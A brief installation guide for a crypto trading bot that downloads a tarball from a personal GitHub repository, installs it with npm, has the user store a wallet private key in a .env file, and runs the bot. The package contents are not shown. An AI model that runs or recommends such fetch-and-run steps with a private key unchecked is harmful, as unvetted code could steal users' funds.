📦 QUICK INSTALLATION:

1. DOWNLOAD & EXTRACT:
   wget https://github.com/romerodevv/psgho/raw/main/worldchain-bot-ultrafast-v2.3.2.tar.gz
   tar -xzf worldchain-bot-ultrafast-v2.3.2.tar.gz
   cd worldchain-bot-ultrafast-v2.3.2/

2. INSTALL DEPENDENCIES:
   npm install

3. CONFIGURE:
   cp .env.example .env
   nano .env  # Add your private key and RPC

4. START & CREATE STRATEGY:
   node worldchain-trading-bot.js
   # Select 5: "Strategy Builder"
   # Create your strategy and watch verbose monitoring!
